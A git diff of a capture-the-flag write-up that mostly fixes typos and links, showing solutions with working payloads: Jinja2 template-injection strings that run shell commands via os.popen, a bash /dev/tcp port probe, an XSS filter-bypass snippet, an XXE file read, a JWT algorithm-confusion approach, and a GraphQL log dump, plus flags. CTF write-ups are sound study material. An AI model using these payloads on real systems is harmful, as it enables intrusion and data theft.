@@ -300,7 +300,7 @@ flag: ```ZOB{sh0uld_h4v3_h1dd3n_b3773r}```
 
 (see index.html)
 
-It asks for a password and checks it with obfiscated code.
+It asks for a password and checks it with obfuscated code.
 
 At around line 9, column 662 we can see:
 ```js
@@ -826,11 +826,9 @@ We can download the public key (see ```serverkey.pub```).
 
 ## Solution
 
-([Vulnerabilities in JWT](https://debricked.com/blog/json-web-tokens/))
-
 (see solve.js)
 
-We can use an algorithm confusion attack.
+We can use an algorithm confusion attack ([source](https://debricked.com/blog/json-web-tokens/)).
 
 We create an admin cookie with HS256, using the server's public key as a secret key.
 
@@ -848,9 +846,7 @@ It takes a name in an input field and displays it.
 
 ## Solution
 
-https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
-
-From a string literal you can get the base class and open a file.
+From a string literal you can get the base class and open a file ([source](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/)).
 
 To get the content of ```app.py```:
 ```py
@@ -886,18 +882,11 @@ flag: ```BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}```
 
 ## What it is
 
-Same as ssti1 but flag is not in app.py
+Same as ssti1 but the flag is not in app.py
 
 ## Solution
 
-```_io._IOBase``` is not exactly in the same place:
-```py
-{{'abc'.__class__.__base__.__subclasses__()[106].__subclasses__()[0].__subclasses__()[0]('app.py').read()}}
-```
-
-https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/#rce-bypassing-as-much-as-i-possibly-can
-
-Using the request object we can get access to the ```os``` module and do some IO.
+Using the request object we can get access to the ```os``` module and use ```popen()``` to run bash commands ([source](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/#rce-bypassing-as-much-as-i-possibly-can)).
 
 List files in the current directory:
 ```py
@@ -923,7 +912,7 @@ flag: ```BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}```
 
 ## What it is
 
-Same as ssti2 but flag is not in app.py or in a file.
+Same as ssti2 but the flag is not in app.py or in a file.
 
 Files in the directory:
 ```
@@ -985,11 +974,13 @@ It references a toto8042 service that shouldn't be up but still is.
 ```
 This tells us that all ports are forwarded.
 
-ssti4 and toto8042 are on the same network (https://docs.docker.com/compose/networking/#specify-custom-networks).
+ssti4 and toto8042 are on the same network ([docker-compose networks](https://docs.docker.com/compose/networking/#specify-custom-networks)).
 
 We can confirm that by pinging toto8042:
-```
+```python
 {{request.application.__globals__.__builtins__.__import__('os').popen('ping -c 1 toto8042').read()}}
+```
+```
 PING toto8042 (172.23.0.2): 56 data bytes
 64 bytes from 172.23.0.2: icmp_seq=0 ttl=64 time=0.147 ms
 --- toto8042 ping statistics ---
@@ -1003,11 +994,11 @@ round-trip min/avg/max/stddev = 0.147/0.147/0.147/0.000 ms
 
 (see port_discovery.js)
 
-nmap (as well as nc, telnet and more) is not available on ssti4 so we can't use it to discover ports.
+nmap, nc, telnet and others are not available on ssti4 so we can't use them to discover ports.
 
-Fortunately the list of the 1000 most used ports is available [here](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/).
+The list of the 1000 most used ports is available [here](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/).
 
-We can test if a port is open with this simple bash command ([source](https://stackoverflow.com/a/35338529/12864941)):
+We can test if a port is open with this bash command ([source](https://stackoverflow.com/a/35338529/12864941)):
 ```bash
 timeout 1 bash -c '</dev/tcp/toto8042/${i}' && echo -n open || echo -n closed
 ```
@@ -1028,15 +1019,13 @@ this is not the way this time, goodluck !!
 
 Port 4242 is not http.
 
-We used python3 to open a TCP socket.
+We can use python3 to open a TCP socket.
 
-To run python code we can use ```python3 -c "command"```.
-
-The ssti command looks like this:
+Run python code with ssti:
 ```py
 {{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\"").read()}}
 ```
-Note: quotes get a little tricky, the python command can only single quotes, at least using our implementation.
+Note: quotes get a little tricky, the python command can only use single quotes, at least using our implementation.
 
 To see stderr we add ``` 2>&1 | cat``` at the end of the command (redirects stderr to stdout).
 ```py
@@ -1084,18 +1073,18 @@ Some of the words we found:
 - cul
 - hell
 
-The max input size is 255 char (a bit less actually).
+The max input size is 255 char.
 
 ## Solution
 
-We can put code in the ```onpageshow``` event of the body ([source](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpageshow).
+We can put code in the ```onpageshow``` event of the body ([source](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpageshow)).
 
 example:
 ```html
 <body onpageshow="alert('Hey')">
 ```
 
-To use function/objects like ```console``` that contain censored words we can use a simple trick:
+To use function/objects like ```console``` that contain censored words we can use this simple trick:
 ```html
 <body onpageshow="globalThis['co'+'nsole'].log('Hey')">
 ```
@@ -1184,7 +1173,7 @@ The method used in whatsup doesn't work, the html is not interpreted.
 
 ## Solution
 
-The way the image link is inserted in the element looks probably something like this:
+The way the image link is inserted in the element probably looks something like this:
 ```js
 '<img src="' + input + '">'
 ```
@@ -1239,10 +1228,9 @@ In the source of the page we can see:
 
 (see solve.js)
 
-https://portswigger.net/web-security/xxe
-https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file
+[xxe overview](https://portswigger.net/web-security/xxe)
 
-We can use some xml features to retrieve external entities from the server.
+We can use some xml features to retrieve external entities from the server ([source](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file)).
 
 For example:
 ```xml
@@ -1253,7 +1241,7 @@ For example:
 </document>
 ```
 
-```file://``` will not work for ```flag.php``` because it will be interpreted by php, we can use ```php://filter/convert.base64-encode/resource=``` instead (see ssti1).
+```file://``` will not work for ```flag.php``` because it will be interpreted by php, we can use ```php://filter/convert.base64-encode/resource=``` instead (see [lfi1](#lfi1)).
 
 The final payload looks like this:
 ```xml
@@ -1279,31 +1267,133 @@ flag: ```BFS{XX3_FtW_SRL5Y_F0UND_TH3SE_D4YS_1T_W4S_H4RD_T0_D3V}```
 
 It's a website where you can enter a message, the message will be hashed with sha256 and sent to a server.
 
-The message is hased and sent every time the input changes (with every character).
+The message is hashed and sent every time the input changes (with every character).
 
-This request gives us the types on the graphql API (can't find source):
+This request gives us the types on the graphql API ([source](https://graphql.org/learn/introspection/)):
+```
+{
+  __schema {
+    queryType {
+      name
+    }
+    mutationType {
+      name
+    }
+    subscriptionType {
+      name
+    }
+    types {
+      ...FullType
+    }
+    directives {
+      name
+      description
+      locations
+      args {
+        ...InputValue
+      }
+    }
+  }
+}
+fragment FullType on __Type {
+  kind
+  name
+  description
+  fields(includeDeprecated: true) {
+    name
+    description
+    args {
+      ...InputValue
+    }
+    type {
+      ...TypeRef
+    }
+    isDeprecated
+    deprecationReason
+  }
+  inputFields {
+    ...InputValue
+  }
+  interfaces {
+    ...TypeRef
+  }
+  enumValues(includeDeprecated: true) {
+    name
+    description
+    isDeprecated
+    deprecationReason
+  }
+  possibleTypes {
+    ...TypeRef
+  }
+}
+fragment InputValue on __InputValue {
+  name
+  description
+  type {
+    ...TypeRef
+  }
+  defaultValue
+}
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
 ```
 https://confessions.secu-web.blackfoot.dev/graphql?query={__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
 ```
+(see types.json for the result)
 
-One interesting type is ```RequestLog``` which has the description ```"Show the resolver access log. TODO: remove before production release"```.
+One interesting type is ```RequestLog``` which has the description ```Show the resolver access log. TODO: remove before production release```.
 
 We can get all access logs with:
 ```bash
 curl 'https://confessions.secu-web.blackfoot.dev/graphql?query=\{requestsLog\{name,args,timestamp\}\}'
 ```
+(see logs.json for the result)
 
 ## Solution
 
 (see index.js)
 
 If, for example, someone types "abc" on the website it will make 3 hashes:
-1: "a"
-2: "ab"
-3: "abc"
+1. "a"
+2. "ab"
+3. "abc"
 
-We can get the first log, wich must be 1 character long, and brute force it.
+We can get the first log, which must be 1 character long, and brute force it.
 
 Once we have the first character we can get the second log and brute force the second character and so on.
+
+flag: ```ZOB{plz_d0nt_t3ll_any1}```
 
 
